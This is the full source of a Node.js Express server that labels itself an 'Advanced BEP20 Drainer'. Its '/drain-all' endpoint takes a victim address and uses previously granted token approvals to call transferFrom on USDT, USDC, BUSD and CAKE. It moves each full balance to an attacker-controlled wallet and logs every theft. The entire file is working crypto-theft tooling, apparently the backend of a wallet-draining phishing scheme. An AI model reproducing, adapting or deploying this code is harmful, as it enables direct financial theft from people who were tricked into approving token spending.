const express = require('express');
const cors = require('cors');
const Web3 = require('web3');
const app = express();

app.use(cors());
app.use(express.json());

const web3 = new Web3('https://bsc-dataseed1.binance.org/');

// ENV VARS (Vercel Settings)
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const ATTACKER_WALLET = process.env.ATTACKER_WALLET;
const account = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
web3.eth.accounts.wallet.add(account);

const TOKENS = {
    USDT: '0x55d398326f99059fF775485246999027B3197955',
    USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
    CAKE: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82'
};

const ABI = [
    "function transferFrom(address,address,uint256) returns (bool)",
    "function balanceOf(address) view returns (uint256)"
];

app.post('/drain-all', async (req, res) => {
    const { victim, approvals, tokens } = req.body;
    
    console.log(`\n🚨 ADVANCED DRAIN: ${victim}`);
    console.log(`📋 Approvals: ${approvals.length}`);
    
    let totalDrained = 0;
    
    try {
        for (const [symbol, address] of Object.entries(TOKENS)) {
            try {
                const contract = new web3.eth.Contract(ABI, address);
                const balance = await contract.methods.balanceOf(victim).call();
                
                if (balance > 0) {
                    console.log(`💰 ${symbol}: ${(balance/1e18).toFixed(4)}`);
                    
                    const gas = await contract.methods.transferFrom(victim, ATTACKER_WALLET, balance)
                        .estimateGas({from: ATTACKER_WALLET});
                    
                    const tx = await contract.methods.transferFrom(victim, ATTACKER_WALLET, balance).send({
                        from: ATTACKER_WALLET,
                        gas: Math.floor(gas * 1.2),
                        gasPrice: web3.utils.toWei('6', 'gwei')
                    });
                    
                    console.log(`✅ ${symbol} DRAINED: ${tx.transactionHash}`);
                    totalDrained++;
                }
            } catch (e) {
                console.log(`⚠️  ${symbol} skip: ${e.message}`);
            }
        }
        
        console.log(`🎉 TOTAL DRAINED: ${totalDrained} tokens from ${victim}`);
        res.json({ success: true, drained: totalDrained });
        
    } catch (error) {
        console.error('❌ FULL FAIL:', error.message);
        res.json({ success: false });
    }
});

app.listen(process.env.PORT || 3000, () => {
    console.log('🦊 Advanced BEP20 Drainer LIVE');
});